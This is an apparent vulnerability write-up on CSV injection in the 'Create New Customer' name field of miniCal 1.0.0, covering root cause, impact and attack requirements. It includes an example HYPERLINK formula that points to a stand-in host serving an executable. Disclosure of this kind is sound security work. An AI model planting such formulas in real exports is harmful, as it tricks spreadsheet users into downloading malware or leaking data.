Based on the provided content, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**
The vulnerability is a CSV Injection issue in the miniCal application. The application doesn't sanitize user-provided input when creating a new customer record, specifically in the 'Name' field. This allows an attacker to inject a malicious formula (e.g., `=HYPERLINK(...)`) that will be executed when the data is exported to a CSV file and opened with a spreadsheet program.

**Weaknesses/Vulnerabilities Present:**
- **CSV Injection:** The application fails to sanitize user-controlled data before exporting it to a CSV file. This allows an attacker to inject malicious formulas/commands.

**Impact of Exploitation:**
- **Code Execution:** By injecting a malicious formula (e.g. `=HYPERLINK("<https://malicious.com/evilshell.exe>","ClickHere")`), an attacker could trick a victim into executing arbitrary code on their machine by downloading and potentially opening a malicious file when opening the CSV with a spreadsheet program.
- **Data Exfiltration:** An attacker can use formulas that can send data to external servers using web requests, thus exfiltrating sensitive data from the victim.
- **Information Disclosure:** Formula injection can also lead to information disclosure if the user is tricked into clicking on the formula leading to execution of an unintended action.

**Attack Vectors:**
- The primary attack vector is through the "Create New Customer" functionality in the Accounting module of the application.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to access and interact with the miniCal application's "Create New Customer" feature in the Accounting module.
- The attacker needs to inject a malicious payload into the "Name" field when creating a new customer record.
- The victim needs to download the CSV report and open it with a spreadsheet software which renders the injected formulas.

**Additional Notes:**
- The provided proof of concept (PoC) clearly demonstrates how to inject the formula.
- The application version affected is minical 1.0.0
- The vulnerability is present in the customer export to CSV functionality.
